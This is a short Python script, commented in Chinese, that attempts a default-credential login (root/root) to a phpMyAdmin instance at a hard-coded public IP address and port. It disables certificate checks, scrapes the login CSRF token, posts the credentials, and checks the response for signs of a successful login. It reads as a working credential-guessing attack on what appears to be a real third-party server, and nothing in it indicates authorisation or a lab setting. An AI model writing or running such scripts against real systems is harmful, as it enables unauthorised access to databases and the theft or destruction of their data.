#!/usr/bin/env python3
"""phpMyAdmin root/root 登录后页面分析"""
import urllib.request, http.cookiejar, ssl, re

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]
B = "http://39.105.7.208:8980/phpmyadmin"

r = op.open(f"{B}/", timeout=10)
html = r.read().decode("utf-8","ignore")
token = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)

# 登录
data = f"pma_username=root&pma_password=root&server=1&token={token}".encode()
op.open(urllib.request.Request(f"{B}/index.php", data=data), timeout=10).read()

# 登录后访问首页(带完整cookie)
r = op.open(f"{B}/index.php", timeout=10)
body = r.read().decode("utf-8","ignore")
print(f"len={len(body)} url={r.geturl()}", flush=True)
# 找关键标记
print("logout标记:", "logout" in body, flush=True)
print("loginform:", "loginform" in body or "pma_username" in body, flush=True)
print("Cannot log in:", "Cannot log in" in body, flush=True)
print("server_databases:", "server_databases" in body, flush=True)
print("navigation:", "navigation" in body, flush=True)
# 页面文本
txt = re.sub(r"<[^>]+>", " ", body)
txt = re.sub(r"\s+", " ", txt)
print("文本:", txt[:300], flush=True)
